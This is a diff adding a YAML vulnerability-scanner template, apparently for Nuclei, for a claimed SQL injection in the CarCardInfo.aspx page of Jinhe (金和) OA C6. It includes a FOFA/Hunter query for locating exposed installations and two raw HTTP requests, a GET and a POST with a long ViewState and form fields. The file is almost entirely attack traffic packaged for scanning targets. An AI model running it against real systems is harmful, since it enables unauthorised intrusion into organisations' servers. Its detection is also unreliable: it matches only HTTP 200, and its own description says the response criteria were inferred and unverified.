@@ -1,0 +1,69 @@
+id: poc-bb60f5d24c0eac439589
+info:
+  name: 金和OAC6CarCardInfo存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bb60f5d24c0eac4395892b6d5131bfc7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bb60f5d24c0eac4395892b6d5131bfc7
+    fofa: + hunter`app.name="金和 OA"`
+http:
+- raw:
+  - 'GET /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=4f3tjvzxcv5jafpefj14hsj0; myie=false
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 2064
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=4f3tjvzxcv5jafpefj14hsj0; myie=false
+
+    Upgrade-Insecure-Requests: 1
+
+
+    _ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=/wEPDwUKMjAyNTc4NzA3NA8WAh4Ic3RyUXVlcnkFCWRlbGZsYWc9MBYCZg9kFgQCAg8PFgIeBFRleHQFBuafpeivomRkAgMPDxYMHglfUGFnZVNpemUCKB4PX1NvcnRBdHRyaWJ1dGVzMtgDAAEAAAD/////AQAAAAAAAAAMAgAAAFFVc2VyV2ViQ29udHJvbC5EYXRhR3JpZCwgVmVyc2lvbj04LjUuNS4xMDAxLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAADlVc2VyV2ViQ29udHJvbC5EYXRhR3JpZC5EYXRhR3JpZCtTb3J0QXR0cmlidXRlc0NvbGxlY3Rpb24BAAAAEEF0dHJpYkNvbGxlY3Rpb24EOFVzZXJXZWJDb250cm9sLkRhdGFHcmlkLkRhdGFHcmlkK1NvcnRBdHRyaWJ1dGVDb2xsZWN0aW9uAgAAAAIAAAAJAwAAAAUDAAAAOFVzZXJXZWJDb250cm9sLkRhdGFHcmlkLkRhdGFHcmlkK1NvcnRBdHRyaWJ1dGVDb2xsZWN0aW9uAQAAABNDb2xsZWN0aW9uQmFzZStsaXN0AxxTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0AgAAAAkEAAAABAQAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBQAACAgJBQAAAAAAAAAAAAAAEAUAAAAAAAAACx4MX1JlY29yZENvdW50Zh4HX2J1dHRvbjLsBAABAAAA/////wEAAAAAAAAADAIAAABRVXNlcldlYkNvbnRyb2wuRGF0YUdyaWQsIFZlcnNpb249OC41LjUuMTAwMSwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsBQEAAAAyVXNlcldlYkNvbnRyb2wuRGF0YUdyaWQuRGF0YUdyaWQrQnV0dG9uc0NvbGxlY3Rpb24BAAAAB2J1dHRvbnMEL1VzZXJXZWJDb250cm9sLkRhdGFHcmlkLkRhdGFHcmlkK0l0ZW1Db2xsZWN0aW9uAgAAAAIAAAAJAwAAAAUDAAAAL1VzZXJXZWJDb250cm9sLkRhdGFHcmlkLkRhdGFHcmlkK0l0ZW1Db2xsZWN0aW9uAQAAABNDb2xsZWN0aW9uQmFzZStsaXN0AxxTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0AgAAAAkEAAAABAQAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBQAACAgJBQAAAAEAAAABAAAAEAUAAAAEAAAACQYAAAANAwUGAAAAJVVzZXJXZWJDb250cm9sLkRhdGFHcmlkLkRhdGFHcmlkK0l0ZW0EAAAABF9JbWcGX1RpdGxlCF9EaXNwbGF5EV9Eb3NjcmlwdGlvblRpdGxlAQEAAQECAAAABgcAAAA3Li4vSkhzb2Z0LlVJLkxpYi9pbWFnZXMvaWNvbi50b29sYmFyLzE2cHgvZGV0ZXJtaW5lLnBuZwYIAAAABuehruWumgEGCQAAAAALHglfSWRlbnRpZnkCAR4LX2RhdGFTb3VyY2UFaTxyb290PjxyZWNvcmQ+PElEPjwvSUQ+PGl0ZW0gQ29sdW1uTmFtZT0n6L2m5Z6LJz48L2l0ZW0+PGl0ZW0gQ29sdW1uTmFtZT0n54mM54WnJz48L2l0ZW0+PC9yZWNvcmQ+PC9yb290PmRkZDBjcKLGVQ0srjgleHod+mIaYrrTfgLo4LEeqBGgCbPL&txt_CarType=1&txt_CarCode=&bt_Search=%B2%E9%D1%AF&__VIEWSTATEGENERATOR=5A747BED&__EVENTTARGET=&__EVENTARGUMENT='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
